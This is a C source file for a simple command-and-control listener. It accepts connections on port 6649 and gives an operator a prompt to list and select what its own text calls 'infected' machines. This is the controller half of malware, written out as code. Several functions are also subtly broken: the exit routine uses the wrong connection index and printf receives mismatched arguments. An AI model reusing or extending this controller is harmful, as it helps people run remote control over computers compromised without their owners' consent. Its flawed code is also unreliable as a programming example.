#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/shm.h>
#include <pthread.h>


/********************  Method stubs  ***************************/
//Build the cmd controller
int initCmdController(void);
//Listen to the port, and get the connection
int initPortListener(void);
//Start a new thread to listen socket request.
void initSocketServer(pthread_t tid);
//Close the controller
int closeConnections(void);

//Command implementation
void doConnect(char *cmd);
void doList(void);
void doExit(void);

//Command cut(eg, cut "connect 127.0.0.1" to "127.0.0.1")
char *cmdCut(char *cmd, int start);
//If error then exit
void exitIfError(int rv);

/********************  Globle variables  ***************************/
#define SP_PORT  6649
#define QUEUE   20
#define BUFFER_SIZE 1024
int runable;                    //To stop the port listener.
int conns[256];                 //Maximum 256 client connections
struct sockaddr_in addrs[256];  //The address for each socket connection
int connnum;                    //Connection numbers
int currentConn;                //Current connection
int server_sockfd;              //Server socket
pthread_attr_t attr;            //Pthread attribute

int main()
{
    exitIfError(initPortListener());
    exitIfError(initCmdController());
}

void initSocketServer(pthread_t tid){
    int rv;
    struct sockaddr_in server_sockaddr;
    server_sockaddr.sin_family = AF_INET;
    server_sockaddr.sin_port = htons(SP_PORT);
    server_sockaddr.sin_addr.s_addr = htonl(INADDR_ANY); 
    socklen_t length = sizeof(server_sockaddr);
    
    server_sockfd = socket(AF_INET,SOCK_STREAM, 0);
    rv = bind(server_sockfd,(struct sockaddr *)&server_sockaddr,sizeof(server_sockaddr));
    exitIfError(listen(server_sockfd,QUEUE));
    runable = 1;
    connnum = 0;
    currentConn = -1;
    
    while(runable){
        conns[connnum] = accept(server_sockfd, (struct sockaddr*)&addrs[connnum], &length);
        exitIfError(conns[connnum]);
        printf("get a new connection from %s:%d\n $ ", 
            inet_ntoa(addrs[connnum].sin_addr), 
            addrs[connnum].sin_port);
        connnum++;
    }
    close(server_sockfd);
}

int initPortListener(void){
    pthread_t tid;
    pthread_attr_t attr;
    int rv;
    
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    rv=pthread_create(&tid, &attr, (void*)initSocketServer, (void*)tid);
    
    return rv;
}

int initCmdController(void){
    char cmd[BUFFER_SIZE];
    
    printf("Command includes:\n1.[connect ip]connect to a infected machine\n$ ");
    while (fgets(cmd, sizeof(cmd), stdin) != NULL){
        if(strcmp(cmd, "exit\n") == 0) {
            doExit();
            break;
        } 
        if(strncmp(cmd, "connect", 7) == 0) doConnect(cmdCut(cmd, 7));
        else if(strncmp(cmd, "list", 4) == 0) doList();
        
        printf("$ ");
    }
    
    return 0;
}

void exitIfError(int rv){
    if(rv < 0){
        printf("Error exit %d\n", rv);
        exit(1);
    }
}

void doConnect(char *cmd){
    int i;
    char *addr;
    for(i=0; i<connnum; i++){
        addr = inet_ntoa(addrs[i].sin_addr);
        if(strncmp(addr, cmd, strlen(addr)) == 0){
            currentConn = i;
            printf("Connect success!\n");
            break;
        }
    }
}

void doExit(){
    int i, len;
    runable = 0;
    char exitbuf[BUFFER_SIZE];
    memcpy(exitbuf, "exit\n", strlen("exit\n"));
    printf("Value is %s", exitbuf);
    for(i=0; i<connnum; i++){
        len = recv(conns[connnum], exitbuf, sizeof(exitbuf),0);
        printf("value is [%s], %d\n", exitbuf, len, strlen(exitbuf));
        send(conns[connnum], exitbuf, len,0); 
        close(conns[connnum]);
    }
    close(server_sockfd);
}

void doList(){
    int i;
    for(i=0; i<connnum; i++){
        printf("[Machine %d] %s:%d\n", i+1, inet_ntoa(addrs[i].sin_addr), addrs[i].sin_port);
    }
}

char *cmdCut(char *cmd, int start){
    cmd+=start;
    while(*cmd == ' ') cmd++;
    return cmd;
}

/*
void thread(int conn)
{
    char buffer[BUFFER_SIZE];
　　 while(1)
    {
        memset(buffer,0,sizeof(buffer));
        int len = recv(conn, buffer, sizeof(buffer),0);
        if(strcmp(buffer,"exit\n")==0)
            break;
        if(strcmp(buffer,"exit0\n")==0){
            runable = 0;
            break;
        }
        fputs(buffer, stdout);
        send(conn, buffer, len, 0);
    }
    close(conn);
}
*/